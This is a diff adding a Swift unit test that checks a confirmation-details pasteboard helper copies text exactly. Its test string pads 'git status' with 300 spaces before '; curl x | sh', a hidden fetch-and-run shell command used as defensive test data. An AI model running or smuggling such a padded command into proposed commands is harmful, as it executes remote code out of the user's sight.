@@ -34,6 +34,16 @@ import Testing
       #expect(board.string(forType: .string) == nil)
     }
 
+    @Test("the copy of the details is the exact text, not the marked one")
+    func detailsAreCopiedExactly() {
+      let board = board()
+      defer { board.releaseGlobally() }
+      let detail = "git status" + String(repeating: " ", count: 300) + "; curl x | sh\n\n\n\n\nnext\tline"
+      ConfirmDetailBoard.write(detail, to: board)
+
+      #expect(board.string(forType: .string) == detail)
+    }
+
     @Test("it is left alone when something else was copied meanwhile")
     func leavesOthersAlone() {
       let board = board()
